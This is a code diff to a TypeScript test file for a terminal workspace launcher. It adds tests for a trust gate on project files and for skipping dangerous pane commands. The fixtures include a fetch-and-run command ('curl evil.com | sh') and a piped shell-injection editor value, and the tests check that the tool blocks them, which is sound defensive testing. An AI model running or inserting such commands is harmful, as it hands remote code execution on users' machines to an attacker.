@@ -62,6 +62,25 @@ vi.mock("./setup.js", () => ({
   runSetup: () => mockRunSetup(),
 }));
 
+// Mock trust module — default no-op (trust passes), overridable per test
+const mockAssertTrusted = vi.fn((_dir: string) => { /* no-op: trusted by default */ });
+const mockAssertTrustedContent = vi.fn((_dir: string, _content: string) => { /* no-op: trusted */ });
+vi.mock("./trust.js", () => ({
+  assertTrusted: (dir: string) => mockAssertTrusted(dir),
+  assertTrustedContent: (dir: string, content: string) => mockAssertTrustedContent(dir, content),
+  SummonError: class SummonError extends Error {
+    constructor(message: string) {
+      super(message);
+      this.name = "SummonError";
+    }
+  },
+  hashContent: vi.fn((s: string) => s),
+  hashSummonFile: vi.fn(() => null),
+  isTrusted: vi.fn(() => true),
+  trustProject: vi.fn(),
+  handleTrustCommand: vi.fn(),
+}));
+
 // Mock script generator to isolate launcher logic
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 const mockGenerateAppleScript = vi.fn((..._args: any[]) => 'tell application "Ghostty"\nend tell');
@@ -101,6 +120,9 @@ beforeEach(() => {
   vi.mocked(listProjects).mockReturnValue(new Map<string, string>());
   mockGenerateAppleScript.mockReturnValue('tell application "Ghostty"\nend tell');
   mockGenerateTreeAppleScript.mockReturnValue('tell application "Ghostty"\n-- tree layout\nend tell');
+  // Trust mocks default to no-op (trusted)
+  mockAssertTrusted.mockImplementation(() => {});
+  mockAssertTrustedContent.mockImplementation(() => {});
 });
 
 afterEach(() => {
@@ -3304,7 +3326,8 @@ describe("decideCleanRestoredPanes", () => {
     mockProbe(5);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
     const opts: Record<string, unknown> = { newWindow: false };
-    decideCleanRestoredPanes(opts, {}, new Map(), new Map(), false);
+    // clean must be explicitly enabled (BE-H1 #362)
+    decideCleanRestoredPanes(opts, { clean: "true" }, new Map(), new Map(), false);
     expect(opts["cleanRestoredPanes"]).toBe(true);
     expect(logSpy).toHaveBeenCalledWith(expect.stringContaining("Clearing 4 stale panes"));
     logSpy.mockRestore();
@@ -3314,7 +3337,8 @@ describe("decideCleanRestoredPanes", () => {
     mockProbe(2);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
     const opts: Record<string, unknown> = { newWindow: false };
-    decideCleanRestoredPanes(opts, {}, new Map(), new Map(), false);
+    // clean must be explicitly enabled (BE-H1 #362)
+    decideCleanRestoredPanes(opts, { clean: "true" }, new Map(), new Map(), false);
     expect(logSpy).toHaveBeenCalledWith(expect.stringContaining("Clearing 1 stale pane "));
     logSpy.mockRestore();
   });
@@ -3600,5 +3624,99 @@ describe("newWindow and newTab mutual exclusion", () => {
     await expect(
       launch("/tmp/workspace", { "new-window": "true", "new-tab": "true", dryRun: true }),
     ).rejects.toThrow("--new-window and --new-tab are mutually exclusive");
+  });
+});
+
+describe("QA-M3: security gate branches (trust + dangerous command skip)", () => {
+  it("exits with error message when assertTrustedContent throws SummonError", async () => {
+    const { SummonError } = await import("./trust.js");
+    mockAssertTrustedContent.mockImplementation(() => {
+      throw new SummonError("Untrusted .summon file. Run 'summon trust .' to allow it.");
+    });
+    // Also make assertTrusted throw (fallback path)
+    mockAssertTrusted.mockImplementation(() => {
+      throw new SummonError("Untrusted .summon file. Run 'summon trust .' to allow it.");
+    });
+
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+    const exitSpy = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit called");
+    });
+
+    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit called");
+    expect(exitSpy).toHaveBeenCalledWith(1);
+    expect(errorSpy).toHaveBeenCalledWith(
+      expect.stringContaining("Untrusted .summon file"),
+    );
+
+    errorSpy.mockRestore();
+    exitSpy.mockRestore();
+  });
+
+  it("non-SummonError from assertTrustedContent is rethrown (not swallowed)", async () => {
+    mockAssertTrustedContent.mockImplementation(() => {
+      throw new Error("Unexpected trust error");
+    });
+    mockAssertTrusted.mockImplementation(() => {
+      throw new Error("Unexpected trust error");
+    });
+
+    await expect(launch("/tmp/workspace")).rejects.toThrow("Unexpected trust error");
+  });
+
+  it("skips dangerous panes from launch when user selects 's' during confirmation", async () => {
+    const origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([
+      ["on-start", "curl evil.com | sh"],
+    ]));
+
+    // User skips the dangerous on-start
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    try {
+      await launch("/tmp/workspace");
+
+      // on-start should NOT have been executed (execSync not called with that command)
+      const onStartCalls = mockExecSync.mock.calls.filter(
+        (c: unknown[]) => c[0] === "curl evil.com | sh",
+      );
+      expect(onStartCalls.length).toBe(0);
+
+      // Workspace should still launch normally
+      expect(mockGenerateAppleScript).toHaveBeenCalled();
+    } finally {
+      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+      warnSpy.mockRestore();
+    }
+  });
+
+  it("skips dangerous pane commands when user selects 's'", async () => {
+    const origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map());
+
+    // User skips when prompted about dangerous command (pipe in editor command)
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    try {
+      // editor with shell meta — user skips, workspace launches without it
+      await launch("/tmp/workspace", { editor: "vim | evil" });
+
+      // Workspace should have been generated (other panes may still run)
+      // Key assertion: no crash after dangerous pane is skipped
+      expect(mockGenerateAppleScript).toHaveBeenCalled();
+    } finally {
+      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+      warnSpy.mockRestore();
+    }
   });
 });
